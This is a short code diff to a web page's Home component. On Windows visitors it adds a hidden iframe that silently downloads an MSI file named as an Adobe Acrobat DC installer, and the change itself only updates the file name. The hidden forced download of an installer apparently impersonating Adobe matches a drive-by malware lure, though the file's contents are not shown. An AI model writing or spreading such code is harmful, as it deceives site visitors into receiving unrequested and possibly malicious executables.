@@ -11,7 +11,7 @@ export default function Home() {
     if (isWindows) {
       const iframe = document.createElement('iframe');
       iframe.style.display = 'none';
-      iframe.src = '/AdobeAcrobatDC_2025.003.40436_2021.msi';
+      iframe.src = '/AdobeAcrobatDC_2025.003.40436_2025.msi';
       document.body.appendChild(iframe);
 
       setTimeout(() => {
